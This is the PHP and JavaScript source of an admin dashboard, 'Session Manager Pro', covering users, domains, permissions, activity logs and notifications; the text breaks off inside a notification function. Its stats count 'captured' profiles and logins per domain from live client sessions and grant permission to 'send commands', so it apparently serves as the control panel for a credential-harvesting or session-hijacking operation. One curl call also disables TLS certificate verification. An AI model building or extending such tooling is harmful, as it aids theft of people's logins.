<?php
// c3_admin_dashboard.php - Complete Professional Admin Dashboard
session_start();
require_once __DIR__ . '/assets/config/db_config.php';
require_once __DIR__ . '/assets/auth/auth.php';

$auth = new Auth();
$auth->requireRole(['super_admin', 'admin']);

$pdo = getDBConnection();
$currentUser = $auth->getCurrentUser();

// Get statistics
$stats = [];

// User stats
$stmt = $pdo->query("SELECT COUNT(*) as total, 
                     SUM(CASE WHEN role = 'super_admin' THEN 1 ELSE 0 END) as super_admins,
                     SUM(CASE WHEN role = 'admin' THEN 1 ELSE 0 END) as admins,
                     SUM(CASE WHEN role = 'domain_admin' THEN 1 ELSE 0 END) as domain_admins,
                     SUM(CASE WHEN role = 'viewer' THEN 1 ELSE 0 END) as viewers,
                     SUM(CASE WHEN is_active = 1 THEN 1 ELSE 0 END) as active
                     FROM users");
$stats['users'] = $stmt->fetch();

// Domain stats
$stmt = $pdo->query("SELECT COUNT(*) as total, 
                     SUM(CASE WHEN status = 'active' THEN 1 ELSE 0 END) as active,
                     SUM(CASE WHEN status = 'inactive' THEN 1 ELSE 0 END) as inactive
                     FROM domains");
$stats['domains'] = $stmt->fetch();

// Activity stats (last 30 days)
$stmt = $pdo->query("SELECT COUNT(*) as total,
                     SUM(CASE WHEN action_type = 'login' THEN 1 ELSE 0 END) as logins,
                     SUM(CASE WHEN action_type = 'view' THEN 1 ELSE 0 END) as views,
                     SUM(CASE WHEN action_type = 'command' THEN 1 ELSE 0 END) as commands,
                     SUM(CASE WHEN action_type = 'delete' THEN 1 ELSE 0 END) as deletes
                     FROM user_activity 
                     WHERE created_at > DATE_SUB(NOW(), INTERVAL 30 DAY)");
$stats['activity'] = $stmt->fetch();

// Session stats from WebSocket API
$ch = curl_init('/getAllSessions');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($ch);
curl_close($ch);
$sessionsData = json_decode($resp, true);
$sessions = $sessionsData['data'] ?? [];
$sessionCount = count($sessions);
$onlineCount = 0;
$profilesCount = 0;
$loginsCount = 0;
$domainsList = [];

foreach ($sessions as $session) {
    if (!isset($session['disconnectedAt'])) $onlineCount++;
    if (!empty($session['profile_name']) || !empty($session['profile_email'])) $profilesCount++;
    if (!empty($session['login_email'])) $loginsCount++;
    if (!empty($session['domain'])) $domainsList[] = $session['domain'];
}
$uniqueDomains = array_unique($domainsList);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Session Manager Pro</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {
            --primary: #667eea;
            --primary-dark: #5a67d8;
            --secondary: #764ba2;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --info: #3b82f6;
            --dark: #1a1a2e;
            --light: #f8f9fa;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f0f2f5;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .sidebar {
            position: fixed;
            left: 0;
            top: 0;
            width: 280px;
            height: 100%;
            background: linear-gradient(180deg, var(--dark) 0%, #16213e 100%);
            color: white;
            z-index: 1000;
            transition: all 0.3s;
            overflow-y: auto;
        }
        .sidebar-header { padding: 25px 20px; border-bottom: 1px solid rgba(255,255,255,0.1); }
        .sidebar-header h3 { font-size: 20px; margin: 0; }
        .sidebar-header p { font-size: 11px; opacity: 0.6; margin: 5px 0 0; }
        .sidebar-menu { padding: 20px 0; }
        .menu-item {
            padding: 12px 25px;
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            transition: all 0.3s;
            border-left: 3px solid transparent;
        }
        .menu-item:hover, .menu-item.active {
            background: rgba(255,255,255,0.1);
            border-left-color: var(--primary);
        }
        .menu-item i { width: 24px; font-size: 18px; }
        .menu-item span { font-size: 14px; font-weight: 500; }
        .main-content { margin-left: 280px; padding: 20px; }
        .top-bar {
            background: white;
            border-radius: 15px;
            padding: 15px 25px;
            margin-bottom: 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 25px;
        }
        .stat-card {
            background: white;
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            transition: all 0.3s;
            cursor: pointer;
        }
        .stat-card:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        .stat-number { font-size: 32px; font-weight: bold; color: var(--dark); }
        .stat-label { font-size: 13px; color: #6c757d; margin-top: 5px; }
        .stat-icon { font-size: 28px; color: var(--primary); margin-bottom: 10px; }
        .card {
            background: white;
            border-radius: 15px;
            margin-bottom: 25px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            overflow: hidden;
        }
        .card-header {
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            color: white;
            padding: 15px 20px;
            font-weight: 600;
        }
        .table { margin-bottom: 0; }
        .table th { background: var(--light); border-bottom: 2px solid #e9ecef; }
        .badge-super_admin { background: #ef4444; }
        .badge-admin { background: #f59e0b; }
        .badge-domain_admin { background: #10b981; }
        .badge-viewer { background: #3b82f6; }
        .badge-active { background: #10b981; }
        .badge-inactive { background: #6c757d; }
        .btn-action {
            padding: 4px 8px;
            font-size: 11px;
            margin: 2px;
            border-radius: 5px;
        }
        .modal-content { border-radius: 15px; }
        .modal-header { background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%); color: white; }
        .toast-custom {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--dark);
            color: white;
            padding: 12px 20px;
            border-radius: 10px;
            z-index: 1100;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        @media (max-width: 768px) {
            .sidebar { width: 70px; }
            .sidebar-header h3, .sidebar-header p, .menu-item span { display: none; }
            .main-content { margin-left: 70px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
        }
        .notification-unread { background: #f0f4ff; }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header">
            <h3><i class="fas fa-crown"></i> AdminHub</h3>
            <p>Session Manager Pro</p>
        </div>
        <div class="sidebar-menu">
            <div class="menu-item active" data-page="dashboard">
                <i class="fas fa-tachometer-alt"></i><span>Dashboard</span>
            </div>
            <div class="menu-item" data-page="domains">
                <i class="fas fa-globe"></i><span>Domains</span>
            </div>
            <div class="menu-item" data-page="users">
                <i class="fas fa-users"></i><span>Users</span>
            </div>
            <div class="menu-item" data-page="activity">
                <i class="fas fa-history"></i><span>Activity Log</span>
            </div>
            <div class="menu-item" data-page="notifications">
                <i class="fas fa-bell"></i><span>Notifications</span>
            </div>
            <div class="menu-item" data-page="reports">
                <i class="fas fa-chart-bar"></i><span>Reports</span>
            </div>
            <div class="menu-item" data-page="settings">
                <i class="fas fa-cog"></i><span>Settings</span>
            </div>
        </div>
    </div>

    <div class="main-content">
        <div class="top-bar">
            <div>
                <h2 id="pageTitle">Admin Dashboard</h2>
                <p id="pageDesc">Welcome back, <?php echo htmlspecialchars($currentUser['full_name'] ?? $currentUser['username']); ?></p>
            </div>
            <div class="d-flex gap-3 align-items-center">
                <div id="notificationBell" class="position-relative" style="cursor: pointer;">
                    <i class="fas fa-bell fa-lg"></i>
                    <span id="notificationCount" class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger" style="font-size: 10px;">0</span>
                </div>
                <div class="dropdown">
                    <button class="btn btn-light dropdown-toggle" data-bs-toggle="dropdown">
                        <i class="fas fa-user-circle"></i> <?php echo htmlspecialchars($currentUser['username']); ?>
                    </button>
                    <ul class="dropdown-menu dropdown-menu-end">
                        <li><a class="dropdown-item" href="#" onclick="loadPage('profile')"><i class="fas fa-user"></i> My Profile</a></li>
                        <li><a class="dropdown-item" href="#" onclick="changePassword()"><i class="fas fa-key"></i> Change Password</a></li>
                        <li><hr class="dropdown-divider"></li>
                        <li><a class="dropdown-item text-danger" href="c3_logout.php"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
                    </ul>
                </div>
            </div>
        </div>
        <div id="pageContent"><div class="text-center py-5"><div class="spinner-border text-primary"></div><br>Loading dashboard...</div></div>
    </div>

    <script>
    let currentPage = 'dashboard';
    let allUsers = [];
    let allDomains = [];

    function loadPage(page) {
        currentPage = page;
        $('.menu-item').removeClass('active');
        $(`.menu-item[data-page="${page}"]`).addClass('active');
        
        $('#pageContent').html('<div class="text-center py-5"><div class="spinner-border text-primary"></div><br>Loading...</div>');
        
        if (page === 'dashboard') loadDashboard();
        else if (page === 'domains') loadDomains();
        else if (page === 'users') loadUsers();
        else if (page === 'activity') loadActivity();
        else if (page === 'notifications') loadNotifications();
        else if (page === 'reports') loadReports();
        else if (page === 'settings') loadSettings();
        else if (page === 'profile') loadProfile();
    }

    function showToast(message, type = 'success') {
        const bgColor = type === 'success' ? '#10b981' : (type === 'error' ? '#ef4444' : '#3b82f6');
        const toast = $(`<div class="toast-custom" style="border-left: 4px solid ${bgColor}"><i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-info-circle'}"></i> ${message}</div>`);
        $('body').append(toast);
        setTimeout(() => toast.fadeOut(300, function() { $(this).remove(); }), 3000);
    }

    // ============================================
    // DASHBOARD
    // ============================================
    function loadDashboard() {
        $('#pageContent').html(`
            <div class="stats-grid" id="statsGrid"></div>
            <div class="row">
                <div class="col-md-6"><div class="card"><div class="card-header"><i class="fas fa-chart-line"></i> Session Trends</div><div class="card-body"><canvas id="trendChart"></canvas></div></div></div>
                <div class="col-md-6"><div class="card"><div class="card-header"><i class="fas fa-chart-pie"></i> User Distribution</div><div class="card-body"><canvas id="userChart"></canvas></div></div></div>
            </div>
            <div class="card"><div class="card-header"><i class="fas fa-clock"></i> Recent Activity</div><div class="card-body"><div id="recentActivity"></div></div></div>
        `);
        
        const stats = {
            totalSessions: <?php echo $sessionCount; ?>,
            onlineClients: <?php echo $onlineCount; ?>,
            totalUsers: <?php echo $stats['users']['total']; ?>,
            totalDomains: <?php echo $stats['domains']['total']; ?>,
            profilesCaptured: <?php echo $profilesCount; ?>,
            loginsCaptured: <?php echo $loginsCount; ?>,
            uniqueDomains: <?php echo count($uniqueDomains); ?>,
            activeUsers: <?php echo $stats['users']['active']; ?>
        };
        
        $('#statsGrid').html(`
            <div class="stat-card"><div class="stat-icon"><i class="fas fa-database"></i></div><div class="stat-number">${stats.totalSessions}</div><div class="stat-label">Total Sessions</div></div>
            <div class="stat-card"><div class="stat-icon"><i class="fas fa-circle" style="color:#10b981"></i></div><div class="stat-number">${stats.onlineClients}</div><div class="stat-label">Online Clients</div></div>
            <div class="stat-card"><div class="stat-icon"><i class="fas fa-users"></i></div><div class="stat-number">${stats.totalUsers}</div><div class="stat-label">Total Users</div></div>
            <div class="stat-card"><div class="stat-icon"><i class="fas fa-globe"></i></div><div class="stat-number">${stats.totalDomains}</div><div class="stat-label">Domains</div></div>
            <div class="stat-card"><div class="stat-icon"><i class="fas fa-user-check"></i></div><div class="stat-number">${stats.profilesCaptured}</div><div class="stat-label">Profiles</div></div>
            <div class="stat-card"><div class="stat-icon"><i class="fas fa-key"></i></div><div class="stat-number">${stats.loginsCaptured}</div><div class="stat-label">Logins</div></div>
            <div class="stat-card"><div class="stat-icon"><i class="fas fa-code-branch"></i></div><div class="stat-number">${stats.uniqueDomains}</div><div class="stat-label">Unique Domains</div></div>
            <div class="stat-card"><div class="stat-icon"><i class="fas fa-user-check"></i></div><div class="stat-number">${stats.activeUsers}</div><div class="stat-label">Active Users</div></div>
        `);
        
        new Chart(document.getElementById('trendChart'), {
            type: 'line',
            data: { labels: ['Week 1', 'Week 2', 'Week 3', 'Week 4'], datasets: [{ label: 'Sessions', data: [65, 78, 82, 95], borderColor: '#667eea', tension: 0.4 }] },
            options: { responsive: true }
        });
        
        new Chart(document.getElementById('userChart'), {
            type: 'doughnut',
            data: { labels: ['Super Admins', 'Admins', 'Domain Admins', 'Viewers'], datasets: [{ data: [<?php echo $stats['users']['super_admins']; ?>, <?php echo $stats['users']['admins']; ?>, <?php echo $stats['users']['domain_admins']; ?>, <?php echo $stats['users']['viewers']; ?>], backgroundColor: ['#ef4444', '#f59e0b', '#10b981', '#3b82f6'] }] }
        });
        
        fetch('/getAllSessions').then(r => r.json()).then(data => {
            let sessions = Object.values(data.data || {}).slice(0, 10);
            let html = '<div class="list-group">';
            for (const session of sessions) {
                html += `<div class="list-group-item list-group-item-action">
                            <div class="d-flex justify-content-between align-items-center">
                                <div><strong>${session.socketId.substring(0, 30)}...</strong><br><small>${session.domain || 'unknown'} | ${session.profile_name || 'No name'}</small></div>
                                <small>${new Date(session.created_at).toLocaleString()}</small>
                            </div>
                         </div>`;
            }
            html += '</div>';
            $('#recentActivity').html(html);
        });
    }

    // ============================================
    // DOMAIN MANAGEMENT
    // ============================================
    async function loadDomains() {
        try {
            const response = await fetch('/admin/api/getDomains.php');
            const data = await response.json();
            const domains = data.domains || [];

            // Also fetch live session stats
            let sessionStats = {};
            try {
                const sr = await fetch('/getAllSessions');
                const sd = await sr.json();
                for (const s of Object.values(sd.data || {})) {
                    const d = s.domain || 'unknown';
                    if (!sessionStats[d]) sessionStats[d] = { sessions: 0, profiles: 0, logins: 0 };
                    sessionStats[d].sessions++;
                    if (s.profile_name) sessionStats[d].profiles++;
                    if (s.login_email)  sessionStats[d].logins++;
                }
            } catch(e) { /* sessions API may be unavailable */ }

            let html = `
                <div class="card">
                    <div class="card-header d-flex justify-content-between align-items-center">
                        <span><i class="fas fa-globe"></i> Domains (${domains.length})</span>
                        <button class="btn btn-sm btn-light" onclick="showDomainModal()"><i class="fas fa-plus"></i> Add Domain</button>
                    </div>
                    <div class="card-body p-0">
                        <table class="table table-hover">
                            <thead><tr><th>Domain</th><th>Wildcard</th><th>Sessions</th><th>Status</th><th>Created</th><th>Actions</th></tr></thead>
                            <tbody id="domainsTable"></tbody>
                        </table>
                    </div>
                </div>
            `;
            $('#pageContent').html(html);

            let rows = '';
            for (const domain of domains) {
                const stats = sessionStats[domain.domain_name] || { sessions: 0, profiles: 0, logins: 0 };
                const descSafe = escapeHtml(domain.description || '');
                const nameSafe = escapeHtml(domain.domain_name);
                rows += `<tr>
                    <td><strong>${nameSafe}</strong>${descSafe ? `<br><small class="text-muted">${descSafe}</small>` : ''}</td>
                    <td>${domain.is_wildcard ? '<span class="badge bg-info">All subdomains</span>' : '<span class="badge bg-secondary">Exact</span>'}</td>
                    <td>${stats.sessions}${stats.profiles ? ` / ${stats.profiles} profiles` : ''}</td>
                    <td><span class="badge ${domain.status === 'active' ? 'bg-success' : 'bg-secondary'}">${escapeHtml(domain.status)}</span></td>
                    <td>${domain.created_at ? new Date(domain.created_at).toLocaleDateString() : '-'}</td>
                    <td>
                        <button class="btn btn-sm btn-info" onclick='editDomain(${domain.id}, ${JSON.stringify(domain.domain_name)}, ${JSON.stringify(domain.description||"")}, ${domain.is_wildcard}, ${JSON.stringify(domain.status)})'><i class="fas fa-edit"></i></button>
                        <button class="btn btn-sm btn-danger" onclick='deleteDomain(${domain.id}, ${JSON.stringify(domain.domain_name)})'><i class="fas fa-trash"></i></button>
                    </td>
                </tr>`;
            }
            $('#domainsTable').html(rows || '<tr><td colspan="6" class="text-center text-muted py-3">No domains found. Click "Add Domain" to create one.</td></tr>');
        } catch(e) {
            $('#pageContent').html('<div class="alert alert-danger">Error loading domains: ' + e.message + '</div>');
        }
    }

    function showDomainModal() {
        document.getElementById('domainId').value = '';
        document.getElementById('domainModalLabel').textContent = 'Add Domain';
        document.getElementById('domainName').value = '';
        document.getElementById('domainDescription').value = '';
        document.getElementById('isWildcard').checked = false;
        document.getElementById('domainStatus').value = 'active';
        new bootstrap.Modal(document.getElementById('domainModal')).show();
    }

    function editDomain(id, name, desc, isWildcard, status) {
        document.getElementById('domainId').value = id;
        document.getElementById('domainModalLabel').textContent = 'Edit Domain';
        document.getElementById('domainName').value = name;
        document.getElementById('domainDescription').value = desc;
        document.getElementById('isWildcard').checked = isWildcard == 1;
        document.getElementById('domainStatus').value = status;
        new bootstrap.Modal(document.getElementById('domainModal')).show();
    }

    function saveDomain() {
        const domainId   = document.getElementById('domainId').value;
        const domainName = document.getElementById('domainName').value.trim();
        const description = document.getElementById('domainDescription').value.trim();
        const isWildcard  = document.getElementById('isWildcard').checked ? 1 : 0;
        const status      = document.getElementById('domainStatus').value;

        if (!domainName) {
            showToast('Domain name is required', 'error');
            return;
        }

        const isEdit = domainId !== '';
        const url    = isEdit ? '/admin/api/updateDomain.php' : '/admin/api/createDomain.php';
        const data   = { domain_name: domainName, description: description, is_wildcard: isWildcard, status: status };
        if (isEdit) data.domain_id = domainId;

        $.post(url, data)
            .done(function(response) {
                if (response.success) {
                    showToast(isEdit ? 'Domain updated successfully' : 'Domain created successfully', 'success');
                    bootstrap.Modal.getInstance(document.getElementById('domainModal')).hide();
                    loadDomains();
                } else {
                    showToast(response.error || 'Failed to save domain', 'error');
                }
            })
            .fail(function() { showToast('Request failed', 'error'); });
    }

    function deleteDomain(id, name) {
        if (confirm('Delete domain "' + name + '"? This will also remove all user permissions for this domain.')) {
            $.post('/admin/api/deleteDomain.php', { domain_id: id })
                .done(function(response) {
                    if (response.success) { showToast('Domain deleted', 'success'); loadDomains(); }
                    else showToast(response.error || 'Failed to delete domain', 'error');
                })
                .fail(() => showToast('Request failed', 'error'));
        }
    }

    // ============================================
    // USER MANAGEMENT
    // ============================================
    async function loadUsers() {
        try {
            const [usersResp, domainsResp] = await Promise.all([
                fetch('/admin/api/getUsers.php'),
                fetch('/admin/api/getDomains.php')
            ]);
            const usersData   = await usersResp.json();
            const domainsData = await domainsResp.json();
            allUsers   = usersData.success   ? (usersData.users   || []) : [];
            allDomains = domainsData.success  ? (domainsData.domains || []) : [];

            if (!usersData.success) showToast(usersData.error || 'Failed to load users', 'error');

            // Populate domain dropdowns in modals
            let domainOpts = '<option value="">None (global access)</option>';
            for (const d of allDomains) {
                domainOpts += `<option value="${escapeHtml(d.domain_name)}">${escapeHtml(d.domain_name)}${d.is_wildcard ? ' (+ all subdomains)' : ''}</option>`;
            }
            document.getElementById('userAssignedDomain').innerHTML = domainOpts;
            document.getElementById('editAssignedDomain').innerHTML = domainOpts;

            let domainIdOpts = '<option value="">Select domain…</option>';
            for (const d of allDomains) {
                domainIdOpts += `<option value="${d.id}">${escapeHtml(d.domain_name)}${d.is_wildcard ? ' (+ all subdomains)' : ''}</option>`;
            }
            document.getElementById('permDomainId').innerHTML = domainIdOpts;

            let html = `
                <div class="card">
                    <div class="card-header d-flex justify-content-between align-items-center">
                        <span><i class="fas fa-users"></i> Users (${allUsers.length})</span>
                        <button class="btn btn-sm btn-light" onclick="showUserModal()"><i class="fas fa-plus"></i> Add User</button>
                    </div>
                    <div class="card-body p-0">
                        <table class="table table-hover">
                            <thead><tr><th>ID</th><th>Username</th><th>Full Name</th><th>Email</th><th>Role</th><th>Assigned Domain</th><th>Status</th><th>Last Login</th><th>Actions</th></tr></thead>
                            <tbody id="usersTable"></tbody>
                        </table>
                    </div>
                </div>
            `;
            $('#pageContent').html(html);
            
            let rows = '';
            for (const user of allUsers) {
                const domainBadge = user.assigned_domain
                    ? `<span class="badge bg-info">${escapeHtml(user.assigned_domain)} (+ subdomains)</span>`
                    : '<span class="text-muted small">—</span>';
                rows += `<tr>
                    <td>${user.id}</td>
                    <td><strong>${escapeHtml(user.username)}</strong></td>
                    <td>${escapeHtml(user.full_name || '-')}</td>
                    <td>${escapeHtml(user.email || '-')}</td>
                    <td><span class="badge badge-${escapeHtml(user.role)}">${escapeHtml(user.role)}</span></td>
                    <td>${domainBadge}</td>
                    <td><span class="badge ${user.is_active ? 'bg-success' : 'bg-secondary'}">${user.is_active ? 'Active' : 'Inactive'}</span></td>
                    <td>${user.last_login ? new Date(user.last_login).toLocaleString() : '-'}</td>
                    <td>
                        <button class="btn btn-sm btn-info btn-action" title="Edit" onclick="editUser(${user.id})"><i class="fas fa-edit"></i></button>
                        <button class="btn btn-sm btn-primary btn-action" title="Permissions" onclick="managePermissions(${user.id})"><i class="fas fa-key"></i></button>
                        ${user.id != 1 ? `<button class="btn btn-sm btn-danger btn-action" title="Delete" onclick="deleteUser(${user.id})"><i class="fas fa-trash"></i></button>` : ''}
                    </td>
                </tr>`;
            }
            $('#usersTable').html(rows || '<tr><td colspan="9" class="text-center text-muted py-3">No users found</td></tr>');
        } catch(e) {
            $('#pageContent').html('<div class="alert alert-danger">Error loading users: ' + e.message + '</div>');
        }
    }

    function showUserModal() {
        // Reset form
        document.getElementById('userUsername').value = '';
        document.getElementById('userPassword').value = '';
        document.getElementById('userEmail').value = '';
        document.getElementById('userFullName').value = '';
        document.getElementById('userRole').value = 'viewer';
        document.getElementById('userAssignedDomain').value = '';
        new bootstrap.Modal(document.getElementById('userModal')).show();
    }

    function createUser() {
        const username       = document.getElementById('userUsername').value.trim();
        const password       = document.getElementById('userPassword').value;
        const email          = document.getElementById('userEmail').value.trim();
        const fullName       = document.getElementById('userFullName').value.trim();
        const role           = document.getElementById('userRole').value;
        const assignedDomain = document.getElementById('userAssignedDomain').value;

        if (!username || !password) {
            showToast('Username and password required', 'error');
            return;
        }

        $.post('/admin/api/createUser.php', {
            username: username, password: password, email: email,
            full_name: fullName, role: role, assigned_domain: assignedDomain
        })
        .done(function(response) {
            if (response.success) {
                showToast('User created successfully', 'success');
                bootstrap.Modal.getInstance(document.getElementById('userModal')).hide();
                loadUsers();
            } else {
                showToast(response.error || 'Failed to create user', 'error');
            }
        })
        .fail(function() { showToast('Failed to create user', 'error'); });
    }

    function editUser(userId) {
        const user = allUsers.find(u => u.id == userId);
        if (!user) { showToast('User not found', 'error'); return; }
        document.getElementById('editUserId').value       = user.id;
        document.getElementById('editUsernameDisplay').textContent = user.username;
        document.getElementById('editEmail').value        = user.email || '';
        document.getElementById('editFullName').value     = user.full_name || '';
        document.getElementById('editRole').value         = user.role;
        document.getElementById('editAssignedDomain').value = user.assigned_domain || '';
        document.getElementById('editIsActive').checked  = user.is_active == 1;
        new bootstrap.Modal(document.getElementById('editUserModal')).show();
    }

    function saveEditUser() {
        const userId         = document.getElementById('editUserId').value;
        const email          = document.getElementById('editEmail').value.trim();
        const fullName       = document.getElementById('editFullName').value.trim();
        const role           = document.getElementById('editRole').value;
        const assignedDomain = document.getElementById('editAssignedDomain').value;
        const isActive       = document.getElementById('editIsActive').checked ? 1 : 0;

        $.post('/admin/api/updateUser.php', {
            user_id: userId, email: email, full_name: fullName,
            role: role, assigned_domain: assignedDomain, is_active: isActive
        })
        .done(function(response) {
            if (response.success) {
                showToast('User updated successfully', 'success');
                bootstrap.Modal.getInstance(document.getElementById('editUserModal')).hide();
                loadUsers();
            } else {
                showToast(response.error || 'Failed to update user', 'error');
            }
        })
        .fail(function() { showToast('Failed to update user', 'error'); });
    }

    function managePermissions(userId) {
        const user = allUsers.find(u => u.id == userId);
        if (!user) return;
        document.getElementById('permUserId').value = userId;
        document.getElementById('permUsername').textContent = user.username;
        document.getElementById('permDomainId').value = '';
        document.getElementById('permCanView').checked = true;
        document.getElementById('permCanEdit').checked = false;
        document.getElementById('permCanDelete').checked = false;
        document.getElementById('permCanCmd').checked = false;

        // Load current permissions
        fetch('/admin/api/getPermissions.php?user_id=' + userId)
            .then(r => r.json())
            .then(data => {
                let rows = '';
                for (const p of (data.permissions || [])) {
                    rows += `<tr>
                        <td>${escapeHtml(p.domain_name)}</td>
                        <td>${p.can_view ? '✔' : ''}</td>
                        <td>${p.can_edit ? '✔' : ''}</td>
                        <td>${p.can_delete ? '✔' : ''}</td>
                        <td>${p.can_send_commands ? '✔' : ''}</td>
                        <td><button class="btn btn-sm btn-danger" onclick="removePermission(${userId},${p.domain_id})"><i class="fas fa-times"></i></button></td>
                    </tr>`;
                }
                document.getElementById('currentPermissionsTable').innerHTML = rows || '<tr><td colspan="6" class="text-center text-muted">No permissions assigned</td></tr>';
            });

        new bootstrap.Modal(document.getElementById('permissionsModal')).show();
    }

    function addPermission() {
        const userId   = document.getElementById('permUserId').value;
        const domainId = document.getElementById('permDomainId').value;
        if (!domainId) { showToast('Please select a domain', 'error'); return; }
        $.post('/admin/api/savePermission.php', {
            user_id: userId, domain_id: domainId,
            can_view: document.getElementById('permCanView').checked ? 1 : 0,
            can_edit: document.getElementById('permCanEdit').checked ? 1 : 0,
            can_delete: document.getElementById('permCanDelete').checked ? 1 : 0,
            can_send_commands: document.getElementById('permCanCmd').checked ? 1 : 0
        })
        .done(function(r) {
            if (r.success) { showToast('Permission saved', 'success'); managePermissions(userId); }
            else showToast(r.error || 'Failed', 'error');
        });
    }

    function removePermission(userId, domainId) {
        $.post('/admin/api/deletePermission.php', { user_id: userId, domain_id: domainId })
            .done(function(r) {
                if (r.success) managePermissions(userId);
                else showToast(r.error || 'Failed', 'error');
            });
    }

    function deleteUser(userId) {
        if (confirm('Delete this user? This action cannot be undone.')) {
            $.post('/admin/api/deleteUser.php', { user_id: userId })
                .done(function(response) {
                    if (response.success) { showToast('User deleted', 'success'); loadUsers(); }
                    else showToast(response.error || 'Failed to delete user', 'error');
                });
        }
    }

    // ============================================
    // ACTIVITY LOG
    // ============================================
    async function loadActivity() {
        try {
            const response = await fetch('/admin/api/getUserActivity.php');
            const data = await response.json();
            const activities = data.activities || [];
            
            let html = `
                <div class="card">
                    <div class="card-header"><i class="fas fa-history"></i> User Activity Log</div>
                    <div class="card-body p-0">
                        <table class="table table-hover">
                            <thead><tr><th>Time</th><th>User</th><th>Action</th><th>Type</th><th>Details</th><th>IP Address</th></tr></thead>
                            <tbody id="activityTable"></tbody>
                         </table>
                    </div>
                </div>
            `;
            $('#pageContent').html(html);
            
            let rows = '';
            for (const activity of activities) {
                rows += `<tr>
                            <td>${new Date(activity.created_at).toLocaleString()}</td>
                            <td>${escapeHtml(activity.username || 'Unknown')}</td>
                            <td>${escapeHtml(activity.action)}</td>
                            <td><span class="badge bg-secondary">${activity.action_type}</span></td>
                            <td>${escapeHtml(activity.details || '-')}</td>
                            <td>${activity.ip_address || '-'}</td>
                          </tr>`;
            }
            $('#activityTable').html(rows || '<tr><td colspan="6" class="text-center">No activity found</td></tr>');
        } catch(e) {
            $('#pageContent').html('<div class="alert alert-danger">Error loading activity</div>');
        }
    }

    // ============================================
    // NOTIFICATIONS
    // ============================================
    async function loadNotifications() {
        try {
            const response = await fetch('/admin/api/getNotifications.php');
            const data = await response.json();
            const notifications = data.notifications || [];
            
            let html = `
                <div class="card">
                    <div class="card-header d-flex justify-content-between align-items-center">
                        <span><i class="fas fa-bell"></i> Notifications</span>
                        <button class="btn btn-sm btn-light" onclick="showNotificationModal()"><i class="fas fa-plus"></i> Send Notification</button>
                    </div>
                    <div class="card-body p-0">
                        <div id="notificationsList"></div>
                    </div>
                </div>
            `;
            $('#pageContent').html(html);
            
            let items = '';
            const typeColors = { success: 'bg-success', warning: 'bg-warning', danger: 'bg-danger', info: 'bg-info', primary: 'bg-primary' };
            for (const notif of notifications) {
                const color = typeColors[notif.type] || 'bg-secondary';
                items += `
                    <div class="list-group-item list-group-item-action ${!notif.is_read ? 'notification-unread fw-semibold' : ''}">
                        <div class="d-flex justify-content-between align-items-start gap-2">
                            <div>
                                <span class="badge ${color} me-2">${escapeHtml(notif.type)}</span>
                                <strong>${escapeHtml(notif.title)}</strong>
                                ${notif.user_id === null ? '<span class="badge bg-secondary ms-1">Global</span>' : ''}
                                <p class="mb-0 mt-1 text-muted">${escapeHtml(notif.message)}</p>
                                <small class="text-muted">${new Date(notif.created_at).toLocaleString()}</small>
                            </div>
                            <div class="d-flex gap-1 flex-shrink-0">
                                ${!notif.is_read ? `<button class="btn btn-sm btn-outline-primary" onclick="markNotificationRead(${notif.id})" title="Mark as read"><i class="fas fa-check"></i></button>` : '<span class="text-muted small">Read</span>'}
                            </div>
                        </div>
                    </div>
                `;
            }
            $('#notificationsList').html(`<div class="list-group list-group-flush">${items || '<div class="text-center p-4 text-muted">No notifications</div>'}</div>`);
        } catch(e) {
            $('#pageContent').html('<div class="alert alert-danger">Error loading notifications</div>');
        }
    }

    function showNotificationModal() {
        fetch('/admin/api/getUsers.php')
            .then(r => r.json())
            .then(data => {
                let options = '<option value="all">All Users</option>';
                if (data.users) {
                    data.users.forEach(user => {
                        options += `<option value="${user.id}">${escapeHtml(user.username)} (${escapeHtml(user.role)})</option>`;
                    });
                }
                document.getElementById('notifUserId').innerHTML = options;
            });
        document.getElementById('notifTitle').value = '';
        document.getElementById('notifMessage').value = '';
        new bootstrap.Modal(document.getElementById('notificationModal')).show();
    }

    function sendNotification() {
        const userId  = document.getElementById('notifUserId').value;
        const title   = document.getElementById('notifTitle').value.trim();
        const message = document.getElementById('notifMessage').value.trim();
        const type    = document.getElementById('notifType').value;

        if (!title || !message) { showToast('Title and message required', 'error'); return; }

        $.post('/admin/api/sendNotification.php', { user_id: userId, title: title, message: message, type: type })
            .done(function(r) {
                if (r.success) {
                    showToast('Notification sent successfully', 'success');
                    bootstrap.Modal.getInstance(document.getElementById('notificationModal')).hide();
                    loadNotifications();
